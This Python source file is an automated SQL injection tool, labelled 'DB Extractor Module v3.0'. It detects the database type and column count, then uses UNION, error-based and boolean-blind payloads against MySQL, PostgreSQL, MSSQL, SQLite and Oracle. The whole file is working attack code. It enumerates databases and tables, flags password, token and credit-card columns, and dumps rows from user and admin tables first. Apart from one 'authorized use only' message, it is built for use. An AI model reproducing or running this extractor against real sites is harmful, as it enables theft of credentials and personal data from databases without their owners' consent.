"""
DB Extractor Module v3.0 - UHQKYRA
Multi-technique SQL injection data extraction:
  1. UNION-based (auto column detection, auto position finding)
  2. Error-based (EXTRACTVALUE/UPDATEXML MySQL, CONVERT MSSQL)
  3. Boolean blind (binary search - fast)
  4. Time-based blind (last resort)
Auto-detects: DB type, injectable param, column count, data position
Supports: MySQL, PostgreSQL, MSSQL, SQLite, Oracle
"""
import re
import time
import urllib.parse
import warnings
warnings.filterwarnings("ignore")

try:
    import requests
    requests.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# Markers - use something unlikely to appear naturally
MARK_S = "SQQLS"
MARK_E = "EQQLE"

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

SQL_ERRORS = [
    r"you have an error in your sql syntax",
    r"warning.*mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"pg_query\(\): query failed",
    r"ora-\d{4,5}",
    r"microsoft.*odbc.*sql server",
    r"sqlite.*error",
    r"division by zero",
    r"supplied argument is not a valid",
    r"column count doesn",
    r"the used select statements have a different number",
    r"invalid column name",
    r"sql syntax.*near",
]

DB_ERRORS = {
    "MySQL":      [r"you have an error.*sql", r"warning.*mysql_", r"error 1064", r"mysql.*syntax"],
    "PostgreSQL": [r"postgresql.*error", r"warning.*pg_", r"psqlexception", r"pg_query"],
    "MSSQL":      [r"microsoft.*sql", r"unclosed quotation", r"odbc.*sql server", r"sqlserver"],
    "SQLite":     [r"sqlite.*error", r"near.*syntax error", r"sqlite_error"],
    "Oracle":     [r"ora-\d{4,5}", r"oracle.*error", r"warning.*oci_"],
}

# DB-specific queries
DB_QUERIES = {
    "MySQL": {
        "version":    "@@version",
        "current_db": "database()",
        "current_user":"user()",
        "hostname":   "@@hostname",
        "datadir":    "@@datadir",
        "databases":  "SELECT GROUP_CONCAT(schema_name ORDER BY schema_name SEPARATOR 0x7c7c) FROM information_schema.schemata",
        "tables":     "SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR 0x7c7c) FROM information_schema.tables WHERE table_schema=database()",
        "tables_db":  "SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR 0x7c7c) FROM information_schema.tables WHERE table_schema=0x{db_hex}",
        "columns":    "SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR 0x7c7c) FROM information_schema.columns WHERE table_name=0x{table_hex}",
        "dump_row":   "SELECT GROUP_CONCAT({cols} SEPARATOR 0x7c2d7c) FROM {table} LIMIT {limit} OFFSET {offset}",
        "concat":     "CONCAT(0x{ms},({query}),0x{me})",
        "error_based": "EXTRACTVALUE(0x0a,CONCAT(0x0a,({query})))",
        "error_based2":"UPDATEXML(NULL,CONCAT(0x0a,({query})),NULL)",
    },
    "PostgreSQL": {
        "version":    "version()",
        "current_db": "current_database()",
        "current_user":"current_user",
        "databases":  "SELECT string_agg(datname,'||') FROM pg_database",
        "tables":     "SELECT string_agg(tablename,'||') FROM pg_tables WHERE schemaname='public'",
        "columns":    "SELECT string_agg(column_name,'||') FROM information_schema.columns WHERE table_name='{table}'",
        "dump_row":   "SELECT {cols} FROM {table} LIMIT {limit} OFFSET {offset}",
        "concat":     "CHR(83)||CHR(81)||CHR(73)||({query})||CHR(69)||CHR(81)||CHR(76)",
        "cast":       "CAST(({query}) AS TEXT)",
    },
    "MSSQL": {
        "version":    "@@version",
        "current_db": "DB_NAME()",
        "current_user":"SYSTEM_USER",
        "databases":  "SELECT STUFF((SELECT '||'+name FROM master..sysdatabases FOR XML PATH('')),1,2,'')",
        "tables":     "SELECT STUFF((SELECT '||'+name FROM sysobjects WHERE xtype='U' FOR XML PATH('')),1,2,'')",
        "columns":    "SELECT STUFF((SELECT '||'+name FROM syscolumns WHERE id=OBJECT_ID('{table}') FOR XML PATH('')),1,2,'')",
        "concat":     "'{ms}'+CAST(({query}) AS VARCHAR(8000))+'{me}'",
        "error_based": "CONVERT(INT,({query}))",
    },
    "SQLite": {
        "version":    "sqlite_version()",
        "current_db": "'main'",
        "current_user":"'sqlite'",
        "tables":     "SELECT GROUP_CONCAT(name,'||') FROM sqlite_master WHERE type='table'",
        "columns":    "SELECT GROUP_CONCAT(name,'||') FROM pragma_table_info('{table}')",
        "dump_row":   "SELECT {cols} FROM {table} LIMIT {limit} OFFSET {offset}",
        "concat":     "'{ms}'||({query})||'{me}'",
    },
    "Oracle": {
        "version":    "(SELECT banner FROM v$version WHERE ROWNUM=1)",
        "current_db": "(SELECT ora_database_name FROM DUAL)",
        "current_user":"USER",
        "tables":     "SELECT LISTAGG(table_name,'||') WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE ROWNUM<=50",
        "columns":    "SELECT LISTAGG(column_name,'||') WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE table_name='{table}'",
        "concat":     "'{ms}'||({query})||'{me}'",
    },
}


def _sess():
    s = requests.Session()
    s.headers["User-Agent"] = UA
    s.verify = False
    return s


def _get(s, url, params, timeout=12):
    try:
        return s.get(url, params=params, timeout=timeout, verify=False, allow_redirects=True)
    except Exception:
        return None


def _post(s, url, data, timeout=12):
    try:
        return s.post(url, data=data, timeout=timeout, verify=False, allow_redirects=True)
    except Exception:
        return None


def _extract_marker(text):
    """Extract text between SQQLS and EQQLE"""
    m = re.search(r'SQQLS(.{0,3000}?)EQQLE', text, re.DOTALL)
    if m:
        return m.group(1).strip()
    return None


def _extract_error(text):
    """Extract value from MySQL error-based injection response"""
    # EXTRACTVALUE returns value in error message
    patterns = [
        r'XPATH syntax error: \'([^\']{1,500})\'',
        r'Xpath syntax error: \'([^\']{1,500})\'',
        r"XPATH syntax error: '([^']{1,500})'",
    ]
    for p in patterns:
        m = re.search(p, text, re.I)
        if m:
            return m.group(1).strip()
    return None


def _parse_base(url):
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    base = url.split('?')[0]
    return base, params


def detect_db_type(url, param=None, callback=None):
    """Auto-detect database type"""
    if not HAS_REQUESTS:
        return "MySQL"

    def cb(t, m):
        if callback: callback({"type": t, "message": m})

    s = _sess()
    base, params = _parse_base(url)

    if not params:
        cb("warn", "Pas de parametres dans l'URL")
        return "MySQL"

    test_p = list(params.keys()) if not param else [param]

    for p in test_p:
        for payload in ["'", '"', "''", "' --", "1'"]:
            tp = params.copy()
            tp[p] = tp.get(p, "1") + payload
            resp = _get(s, base, tp)
            if not resp:
                continue
            body = resp.text.lower()
            for db, patterns in DB_ERRORS.items():
                for pat in patterns:
                    if re.search(pat, body, re.I):
                        cb("found", f"DB type: {db}")
                        return db

    cb("info", "DB type non detecte, MySQL par defaut")
    return "MySQL"


def _detect_columns_order_by(s, base, params, param, callback=None):
    """Detect column count using ORDER BY"""
    orig = params.get(param, "1")
    for n in range(1, 25):
        tp = params.copy()
        tp[param] = f"{orig}' ORDER BY {n}-- -"
        resp = _get(s, base, tp)
        if resp:
            body = resp.text.lower()
            if any(re.search(pat, body, re.I) for pat in [
                r"unknown column", r"order by", r"1054", r"column.*order",
                r"error", r"sql syntax", r"invalid"
            ]) and resp.status_code in [200, 500]:
                # Check if previous worked
                if n > 1:
                    return n - 1
        if resp and resp.status_code in [500, 503]:
            return max(n - 1, 1)
    return None


def _detect_columns_union(s, base, params, param, callback=None):
    """Detect column count using UNION NULL technique"""
    orig = params.get(param, "1")
    for n in range(1, 25):
        nulls = ",".join(["NULL"] * n)
        for suffix in ["-- -", "#", "--", "/*"]:
            tp = params.copy()
            tp[param] = f"0' UNION SELECT {nulls}{suffix}"
            resp = _get(s, base, tp)
            if resp and resp.status_code == 200:
                body = resp.text.lower()
                # Not a SQL error means this count worked
                if not any(re.search(pat, body) for pat in [
                    r"column count doesn", r"different number",
                    r"the used select", r"error 1222"
                ]):
                    if callback:
                        callback({"type": "info", "message": f"  {n} colonne(s) detectee(s) (UNION)"})
                    return n
    return None


def _find_visible_column(s, base, params, param, num_cols, db_type, callback=None):
    """Find which column position reflects data in the response"""
    ms_hex = MARK_S.encode().hex()
    me_hex = MARK_E.encode().hex()

    for pos in range(num_cols):
        cols = ["NULL"] * num_cols
        if db_type == "MySQL":
            cols[pos] = f"CONCAT(0x{ms_hex},0x{me_hex})"
        elif db_type in ("PostgreSQL", "SQLite", "Oracle"):
            cols[pos] = f"'{MARK_S}'||'{MARK_E}'"
        else:
            cols[pos] = f"'{MARK_S}'+'{MARK_E}'"

        for suffix in ["-- -", "#", "--"]:
            tp = params.copy()
            tp[param] = f"0' UNION SELECT {','.join(cols)}{suffix}"
            resp = _get(s, base, tp)
            if resp and MARK_S in resp.text and MARK_E in resp.text:
                if callback:
                    callback({"type": "info", "message": f"  Position visible: col {pos+1}/{num_cols}"})
                return pos, suffix

    return 0, "-- -"


def _union_query(s, base, params, param, query, num_cols, visible_pos, suffix, db_type):
    """Execute a UNION-based query and return extracted value"""
    ms_hex = MARK_S.encode().hex()
    me_hex = MARK_E.encode().hex()

    cols = ["NULL"] * num_cols
    if db_type == "MySQL":
        cols[visible_pos] = f"CONCAT(0x{ms_hex},IFNULL(CAST(({query}) AS CHAR),'null'),0x{me_hex})"
    elif db_type == "PostgreSQL":
        cols[visible_pos] = f"'{MARK_S}'||COALESCE(({query})::text,'')||'{MARK_E}'"
    elif db_type == "MSSQL":
        cols[visible_pos] = f"'{MARK_S}'+ISNULL(CAST(({query}) AS NVARCHAR(MAX)),'')+'{MARK_E}'"
    elif db_type == "SQLite":
        cols[visible_pos] = f"'{MARK_S}'||IFNULL(({query}),'')||'{MARK_E}'"
    elif db_type == "Oracle":
        cols[visible_pos] = f"'{MARK_S}'||({query})||'{MARK_E}'"

    tp = params.copy()
    tp[param] = f"0' UNION SELECT {','.join(cols)}{suffix}"
    resp = _get(s, base, tp)
    if resp:
        val = _extract_marker(resp.text)
        if val is not None:
            return val
    return None


def _error_based_query(s, base, params, param, query, db_type):
    """Execute error-based extraction (MySQL EXTRACTVALUE/UPDATEXML)"""
    if db_type != "MySQL":
        return None

    for payload_tpl, extractor in [
        ("' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,({q})))-- -", _extract_error),
        ("' AND UPDATEXML(NULL,CONCAT(0x23,({q})),NULL)-- -", _extract_error),
        ("' OR EXTRACTVALUE(0x0a,CONCAT(0x0a,({q})))-- -", _extract_error),
    ]:
        tp = params.copy()
        orig = tp.get(param, "1")
        tp[param] = payload_tpl.replace("{q}", query)
        resp = _get(s, base, tp)
        if resp:
            val = extractor(resp.text)
            if val:
                return val

    return None


def _boolean_blind_extract(s, base, params, param, query, db_type, callback=None):
    """Extract data using boolean blind + binary search"""
    result = ""
    if db_type == "MySQL":
        true_p  = "' AND 1=1-- -"
        false_p = "' AND 1=2-- -"
        length_q = lambda n: f"' AND LENGTH(({query}))>{n}-- -"
        char_q   = lambda pos, code: f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{code}-- -"
    elif db_type == "PostgreSQL":
        true_p  = "' AND 1=1-- -"
        false_p = "' AND 1=2-- -"
        length_q = lambda n: f"' AND LENGTH(({query}))>{n}-- -"
        char_q   = lambda pos, code: f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{code}-- -"
    else:
        return None

    tp = params.copy()
    tp[param] = tp.get(param, "1") + true_p
    r_true = _get(s, base, tp)
    tp2 = params.copy()
    tp2[param] = tp2.get(param, "1") + false_p
    r_false = _get(s, base, tp2)
    if not r_true or not r_false:
        return None

    true_size = len(r_true.text)
    false_size = len(r_false.text)
    if abs(true_size - false_size) < 20:
        return None  # Can't distinguish boolean responses

    def is_true(payload):
        tp3 = params.copy()
        tp3[param] = tp3.get(param, "1") + payload
        r = _get(s, base, tp3)
        if not r:
            return False
        return abs(len(r.text) - true_size) < abs(len(r.text) - false_size)

    # Detect length
    length = 0
    for n in range(0, 200):
        if not is_true(length_q(n)):
            length = n
            break

    if length == 0:
        return None

    if callback:
        callback({"type": "info", "message": f"  Longueur: {length} chars"})

    # Binary search each character
    for pos in range(1, length + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if is_true(char_q(pos, mid)):
                lo = mid + 1
            else:
                hi = mid
        result += chr(lo)
        if callback and pos % 10 == 0:
            callback({"type": "info", "message": f"  Extrait: {result}"})

    return result


class DBExtractor:
    """Main DB extractor - tries all techniques automatically"""

    def __init__(self, url, param=None, db_type=None, callback=None):
        self.url = url if "://" in url else "http://" + url
        self.base, self.params = _parse_base(self.url)
        self.s = _sess()
        self.db_type = db_type
        self.num_cols = None
        self.visible_pos = 0
        self.suffix = "-- -"
        self.technique = None  # "union", "error", "blind"
        self._cb = callback
        self.param = param or (list(self.params.keys())[0] if self.params else None)
        self.results = {
            "url": self.url, "param": self.param, "db_type": None,
            "technique": None, "version": None, "current_db": None,
            "current_user": None, "hostname": None, "datadir": None,
            "databases": [], "tables": [], "columns": {}, "data": {},
        }

    def cb(self, t, m):
        if self._cb:
            self._cb({"type": t, "message": m})

    def init(self):
        """Auto-detect DB, columns, technique"""
        if not self.param:
            self.cb("warn", "Aucun parametre injectable trouve")
            return False

        # 1. Detect DB type
        if not self.db_type:
            self.cb("info", f"Detection DB pour param '{self.param}'...")
            self.db_type = detect_db_type(self.url, self.param, self._cb) or "MySQL"
        self.results["db_type"] = self.db_type
        self.cb("found", f"DB: {self.db_type}")

        # 2. Detect column count
        self.cb("info", "Detection nombre de colonnes...")
        n = _detect_columns_order_by(self.s, self.base, self.params, self.param)
        if not n:
            n = _detect_columns_union(self.s, self.base, self.params, self.param)
        if not n:
            n = 3  # fallback
            self.cb("warn", f"Colonnes non detectees, essai avec {n}")
        else:
            self.cb("info", f"  {n} colonne(s)")
        self.num_cols = n

        # 3. Find visible column for UNION
        self.cb("info", "Recherche colonne visible...")
        self.visible_pos, self.suffix = _find_visible_column(
            self.s, self.base, self.params, self.param, n, self.db_type, self._cb
        )

        # 4. Determine technique
        test_q = DB_QUERIES[self.db_type]["version"] if self.db_type in DB_QUERIES else "@@version"
        val = _union_query(self.s, self.base, self.params, self.param,
                           test_q, n, self.visible_pos, self.suffix, self.db_type)
        if val:
            self.technique = "union"
            self.results["version"] = val
            self.cb("found", f"UNION fonctionne ! Version: {val[:80]}")
        else:
            self.cb("warn", "UNION non visible, test error-based...")
            val = _error_based_query(self.s, self.base, self.params, self.param, test_q, self.db_type)
            if val:
                self.technique = "error"
                self.results["version"] = val
                self.cb("found", f"Error-based fonctionne ! Version: {val[:80]}")
            else:
                self.cb("warn", "Error-based echoue, test boolean blind...")
                self.technique = "blind"

        self.results["technique"] = self.technique
        return True

    def query(self, sql_query):
        """Execute a query and return result using best available technique"""
        if self.technique == "union":
            return _union_query(self.s, self.base, self.params, self.param,
                                sql_query, self.num_cols, self.visible_pos, self.suffix, self.db_type)
        elif self.technique == "error":
            return _error_based_query(self.s, self.base, self.params, self.param,
                                      sql_query, self.db_type)
        elif self.technique == "blind":
            return _boolean_blind_extract(self.s, self.base, self.params, self.param,
                                          sql_query, self.db_type, self._cb)
        return None

    def extract_info(self):
        """Extract version, db, user, hostname"""
        q = DB_QUERIES.get(self.db_type, DB_QUERIES["MySQL"])

        if not self.results.get("version"):
            v = self.query(q["version"])
            if v:
                self.results["version"] = v

        v = self.query(q["current_db"])
        if v:
            self.results["current_db"] = v
            self.cb("found", f"DB courante: {v}")

        v = self.query(q["current_user"])
        if v:
            self.results["current_user"] = v
            self.cb("found", f"Utilisateur: {v}")

        if self.db_type == "MySQL":
            v = self.query("@@hostname")
            if v:
                self.results["hostname"] = v
                self.cb("found", f"Hostname: {v}")
            v = self.query("@@datadir")
            if v:
                self.results["datadir"] = v
                self.cb("found", f"Datadir: {v}")

    def extract_databases(self):
        """List all databases"""
        q = DB_QUERIES.get(self.db_type, DB_QUERIES["MySQL"])
        if "databases" not in q:
            return []
        raw = self.query(q["databases"])
        if raw:
            dbs = [d.strip() for d in raw.split("||") if d.strip()]
            self.results["databases"] = dbs
            for db in dbs:
                self.cb("found", f"Database: {db}")
            return dbs
        return []

    def extract_tables(self, database=None):
        """List tables"""
        q = DB_QUERIES.get(self.db_type, DB_QUERIES["MySQL"])
        if database and "tables_db" in q:
            sql = q["tables_db"].replace("{db_hex}", database.encode().hex())
        elif "tables" in q:
            sql = q["tables"]
        else:
            return []

        raw = self.query(sql)
        if raw:
            tables = [t.strip() for t in raw.split("||") if t.strip()]
            self.results["tables"] = tables
            for t in tables:
                sens = any(w in t.lower() for w in [
                    "user", "admin", "pass", "credential", "secret", "token",
                    "account", "auth", "member", "login", "customer", "order", "payment"
                ])
                label = "SENS" if sens else "TABLE"
                self.cb("found" if not sens else "vuln", f"{label}: {t}")
            return tables
        return []

    def extract_columns(self, table):
        """List columns of a table"""
        q = DB_QUERIES.get(self.db_type, DB_QUERIES["MySQL"])
        if "columns" not in q:
            return []
        sql = q["columns"].replace("{table}", table).replace("{table_hex}", table.encode().hex())
        raw = self.query(sql)
        if raw:
            cols = [c.strip() for c in raw.split("||") if c.strip()]
            self.results["columns"][table] = cols
            for c in cols:
                sens = any(w in c.lower() for w in [
                    "pass", "pwd", "secret", "token", "hash", "salt",
                    "credit", "card", "ssn", "email", "key"
                ])
                label = "KEY" if sens else "COL"
                self.cb("vuln" if sens else "found", f"{label}: {c}")
            return cols
        return []

    def dump_table(self, table, columns, limit=50):
        """Dump rows from a table"""
        rows = []

        if self.db_type == "MySQL":
            # Dump all rows at once with GROUP_CONCAT
            cols_expr = ",0x3b2d3b,".join([f"IFNULL({c},'null')" for c in columns])
            row_sep = "0x0a2d2d0a"  # \n--\n
            sql = f"SELECT GROUP_CONCAT({cols_expr} ORDER BY 1 SEPARATOR {row_sep}) FROM {table} LIMIT {limit}"
            raw = self.query(sql)
            if raw:
                for i, row_str in enumerate(raw.split("\n--\n")):
                    vals = row_str.split(";-;")
                    row = {c: (vals[j] if j < len(vals) else "") for j, c in enumerate(columns)}
                    rows.append(row)
                    row_disp = " | ".join(f"{k}={v[:30]}" for k, v in row.items())
                    self.cb("found", f"  [{i+1}] {row_disp}")
        else:
            # Row by row for other DBs
            for offset in range(limit):
                if self.db_type == "PostgreSQL":
                    cols_expr = "||';-;'||".join([f"COALESCE({c}::text,'')" for c in columns])
                    sql = f"SELECT {cols_expr} FROM {table} LIMIT 1 OFFSET {offset}"
                elif self.db_type == "SQLite":
                    cols_expr = "||';-;'||".join([f"IFNULL({c},'')" for c in columns])
                    sql = f"SELECT {cols_expr} FROM {table} LIMIT 1 OFFSET {offset}"
                else:
                    cols_expr = "+';-;'+".join([f"ISNULL(CAST({c} AS NVARCHAR(MAX)),'')" for c in columns])
                    sql = f"SELECT {cols_expr} FROM {table}"

                raw = self.query(sql)
                if not raw or raw == "null":
                    break
                vals = raw.split(";-;")
                row = {c: (vals[j] if j < len(vals) else "") for j, c in enumerate(columns)}
                rows.append(row)
                row_disp = " | ".join(f"{k}={v[:30]}" for k, v in row.items())
                self.cb("found", f"  [{offset+1}] {row_disp}")

        self.results["data"][table] = rows
        self.cb("ok", f"{len(rows)} lignes extraites de '{table}'")
        return rows


def full_db_extraction(url, param=None, mode="enum", db_type=None,
                       target_table=None, target_columns=None,
                       limit=50, callback=None):
    """
    Full automated DB extraction
    mode: "basic" = info only | "enum" = info+databases+tables | "dump" = full dump
    """
    def cb(t, m):
        if callback: callback({"type": t, "message": m})

    if not HAS_REQUESTS:
        cb("error", "requests non disponible")
        return {}

    cb("info", f"Extraction DB sur {url}")
    cb("warn", "Usage autorise uniquement !")

    ext = DBExtractor(url, param, db_type, callback)

    if not ext.init():
        cb("error", "Impossible d'initialiser l'extracteur (pas de parametre injectable ?)")
        return ext.results

    cb("section", "\n--- INFORMATIONS DB ---")
    ext.extract_info()

    if mode in ("enum", "dump"):
        cb("section", "\n--- BASES DE DONNEES ---")
        ext.extract_databases()

        cb("section", "\n--- TABLES ---")
        tables = ext.extract_tables()

        if mode == "dump":
            # Prioritize sensitive tables
            sensitive_tables = [t for t in tables if any(
                w in t.lower() for w in ["user", "admin", "account", "member", "login", "customer", "employee"]
            )]
            dump_targets = sensitive_tables or tables[:3]

            if target_table:
                dump_targets = [target_table]

            for table in dump_targets[:3]:
                cb("section", f"\n--- DUMP: {table} ---")
                cols = target_columns or ext.extract_columns(table)
                if cols:
                    ext.dump_table(table, cols, limit=limit)

    cb("ok", "\nExtraction DB terminee !")
    return ext.results


# Keep legacy function signatures for backward compat
def detect_db_type_legacy(url, param, callback=None):
    return detect_db_type(url, param, callback)

def get_databases(url, param, db_type=None, num_columns=2, callback=None):
    ext = DBExtractor(url, param, db_type, callback)
    if ext.init():
        return ext.extract_databases()
    return []

def get_tables(url, param, database=None, db_type=None, num_columns=2, callback=None):
    ext = DBExtractor(url, param, db_type, callback)
    if ext.init():
        return ext.extract_tables(database)
    return []

def get_columns(url, param, table, database=None, db_type=None, num_columns=2, callback=None):
    ext = DBExtractor(url, param, db_type, callback)
    if ext.init():
        return ext.extract_columns(table)
    return []

def dump_table(url, param, table, columns, limit=20, database=None, db_type=None, num_columns=2, callback=None):
    ext = DBExtractor(url, param, db_type, callback)
    if ext.init():
        return ext.dump_table(table, columns, limit)
    return []
